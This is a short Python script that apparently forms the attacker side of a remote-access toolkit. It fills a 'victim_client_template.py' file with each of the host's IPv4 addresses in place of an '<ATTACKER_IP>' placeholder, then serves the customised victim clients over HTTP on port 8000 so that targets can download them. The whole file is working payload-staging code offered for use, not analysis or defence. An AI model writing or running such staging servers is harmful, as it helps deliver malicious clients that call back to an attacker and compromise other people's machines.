import http.server
import os
import shutil
import socketserver
import netifaces

PORT = 8000
SERVING_DIRECTORY = '/tmp/pheelpwncat/'
VICTIM_CLIENT_FILENAME = 'victim_client_template.py'

def main():
    prepare_serving_directory(SERVING_DIRECTORY)
    os.chdir(SERVING_DIRECTORY)
    ipv4s = fetch_ipv4_addresses()
    create_victim_clients_for_addresses(VICTIM_CLIENT_FILENAME, ipv4s)

    http_handler = http.server.SimpleHTTPRequestHandler
    with socketserver.TCPServer(('', PORT), http_handler) as httpd:
        print('HTTP server information:')
        print(f'  Serving on {PORT}')
        print(f'  Serving directory {SERVING_DIRECTORY}')

        print('IPv4 addresses:')
        for ipv4 in ipv4s:
            print(f'  {ipv4}')

        print('Available files:')
        for available_file in os.listdir():
            print(f'  {available_file}')

        print('Waiting for requests...')
        httpd.serve_forever()

def create_victim_clients_for_addresses(template_filename, ipv4s):
    with open(template_filename, 'r') as template_file:
        data = template_file.read()

    for ipv4 in ipv4s:
        address_specific_data = data.replace('<ATTACKER_IP>', ipv4)
        address_specific_filename = template_filename.replace('template.py', f'{ipv4}.py')
        with open(address_specific_filename, 'w') as file:
            file.write(address_specific_data)

def prepare_serving_directory(directory):
    os.makedirs(directory, exist_ok=True)
    shutil.copy2(VICTIM_CLIENT_FILENAME, directory)

def fetch_ipv4_addresses():
    ip_list = set()
    for interface in netifaces.interfaces():
        if netifaces.AF_INET in netifaces.ifaddresses(interface):
            for link in netifaces.ifaddresses(interface)[netifaces.AF_INET]:
                address = link['addr']
                if address != '127.0.0.1':
                    ip_list.add(address)

    return list(ip_list)

if __name__ == '__main__':
    main()
